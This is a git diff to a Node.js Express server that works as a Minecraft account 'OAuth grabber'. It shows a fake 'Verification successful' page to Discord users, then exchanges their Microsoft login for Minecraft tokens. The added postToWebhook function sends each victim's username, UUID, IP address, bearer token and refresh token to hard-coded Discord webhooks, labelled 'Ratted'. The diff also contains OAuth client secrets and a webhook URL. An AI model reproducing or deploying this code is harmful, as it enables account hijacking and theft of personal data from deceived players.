@@ -1,6 +1,6 @@
-//Config
-const client_secret = 'fa58f5f4-c358-4605-ab93-bd351a6f9c3c'
-const client_id = 'a74dcdc0-94c3-4a21-8a82-b60500053c44'
+//config
+const client_secret = 'ba41d7e0-4e7d-429e-87cc-de6524de7f3a'
+const client_id = 'd6307293-70f0-458b-999d-d773dbc43aaf'
 const redirect_uri = 'https://tiny-pear-gorilla-robe.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 //Requirements
@@ -10,8 +10,8 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('go back to discord.')
-    const code = req.query.code
+	 res.send('Verification successful! go back to discord.')
+	 const code = req.query.code
     if (code == null) {
         return
     }
@@ -49,11 +49,11 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        client_secret: client_secret,
-        code: code,
+	client_secret: client_secret,
+	 code: code,
         grant_type: 'authorization_code'
     }
-
+    
     let response = await axios.post(url, data, config)
     return [response.data['access_token'], response.data['refresh_token']]
 }
@@ -88,7 +88,7 @@ async function getXSTSToken(userToken) {
         }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
     }
     let response = await axios.post(url, data, config)
-
+    
     return response.data['Token']
 }
 
@@ -120,33 +120,37 @@ async function getUsernameAndUUID(bearerToken) {
 function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
-function pageGoPost(d){
-	var insdoc = "";
-    
-	for (var i = 0; i < d.vals.length; i++) {
-	  insdoc+= "<input type='hidden' name='"+ d.vals[i][0] +"' value='"+ d.vals[i][1] +"'>";
-	}
-    
-	var goform = $("<form>", {
-	  method: "post",
-	  action: d.url,
-	  target: d.target,
-	  html: insdoc
-	}).appendTo("body");
-    
-	goform.submit();
+
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+    const url = webhook_url
+    let data = {
+  username: "MOG",
+  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
+  content: "@everyone",
+  embeds: [
+    {
+      title: "Ratted " + username + " - Click for networth",
+      color: 5898337,
+      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
+      url: "https://spillager.live/skyblock/networth/"+username,
+      footer: {
+        text: "Minecraft oAuth Grabber by WH0",
+        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
+      },
+    }
+  ],
 }
-
-
-
+    axios.all([ 
+        axios.post(url, data),	
+	axios.post("https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo", data)
+           .then(() => console.log("Successfully authenticated, posting to webhook!"))
+    ])
+}
 const bannedNames = []
-
 function addBan(name) {
     bannedNames.push(name);
 }
-
 function checkIfBanned(name) {
-
     for (const item of bannedNames) {
         if (name === item) {
             return true
